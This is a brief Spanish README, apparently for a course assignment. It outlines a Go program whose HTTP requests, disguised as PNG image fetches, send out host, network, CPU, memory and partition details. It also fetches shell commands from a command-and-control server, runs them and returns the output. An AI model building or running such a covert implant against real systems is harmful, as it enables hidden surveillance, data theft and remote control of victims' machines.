# Segunda evaluación

### Diseño
```txt
src/
|- app
  \- main.go
|- lib
  \- utils.go
|- webserver
  \- server.go
```

### Variables de entorno
- DEBUG: el valor 1 de ésta variable indica al programa que se ejecute imprimiendo información util para la depuración


### LLamadas ofuscadas
- GET http://{{server}}/images/i/ho.png 	- informacion del host
- GET http://{{server}}/images/i/ni.png	 	- net interfaces
- GET http://{{server}}/images/i/hi.png 	- hosts ips
- GET http://{{server}}/images/i/cp.png 	- informacion de las cpus
- GET http://{{server}}/images/i/me.png 	- informacion de la memoria
- GET http://{{server}}/images/i/pa.png	 	- informacion de las particiones
- GET http://{{server}}/images/i/pu.png 	- informacion del uso de las particiones

### LLamadas c2cmd
- GET http://{{server}}/images/c/cp.png	 	- check payload: descarga el comando para crear una nueva shell, los valores/comando dependerán del sistema operativo del cliente - "powershell:"

- GET http://{{server}}/images/c/cm.png		- comandos: solicita un comando, si el stack esta vacío retorna 304
- GET http://{{server}}/images/c/cr.png		- respuesta comando: retorna la salida de un comando ejecutado, 
- 
